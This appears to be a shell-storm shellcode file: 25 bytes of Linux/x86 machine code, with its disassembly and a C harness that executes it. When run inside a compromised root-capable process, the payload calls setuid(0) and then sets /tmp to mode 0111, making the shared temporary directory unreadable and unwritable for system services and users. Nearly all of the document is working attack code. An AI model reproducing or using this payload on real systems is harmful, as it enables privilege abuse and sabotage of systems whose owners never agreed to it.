/*
   Linux/x86 - setuid(0) & chmod("/tmp",111) & exit(0)
   	
	Info reg
        ------------------
   	%eax = 23
	%ebx = 0

	%eax = 15
   	%ebx = /tmp
   	%ecx = 111

        %eax = 1
        %ebx = 0
   
   Shellcode 25 bytes
   Author: Jonathan Salwan < submit [AT] shell-storm.org >
   Web: http://www.shell-storm.org


 Disassembly of section .text:

 08048054 <.text>:
 8048054:	6a 23                	push   $0x23
 8048056:	58                   	pop    %eax
 8048057:	31 db                	xor    %ebx,%ebx
 8048059:	cd 80                	int    $0x80
 804805b:	51                   	push   %ecx
 804805c:	b1 49                	mov    $0x49,%cl
 804805e:	68 2f 74 6d 70       	push   $0x706d742f
 8048063:	89 e3                	mov    %esp,%ebx
 8048065:	6a 0f                	push   $0xf
 8048067:	58                   	pop    %eax
 8048068:	cd 80                	int    $0x80
 804806a:	40                   	inc    %eax
 804806b:	cd 80                	int    $0x80

*/

#include "stdio.h"

int main(int argc, char *argv[])
{

	char shellcode[] = 	"\x6a\x23\x58\x31"   // setuid(0)
				"\xdb\xcd\x80"       

				"\x51\xb1\x49\x68"
				"\x2f\x74\x6d\x70"   // chmod("/tmp",111)
				"\x89\xe3\x6a\x0f"
				"\x58\xcd\x80"

				"\x40\xcd\x80";      // exit(0)
				
				

	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
	
	return 0;
}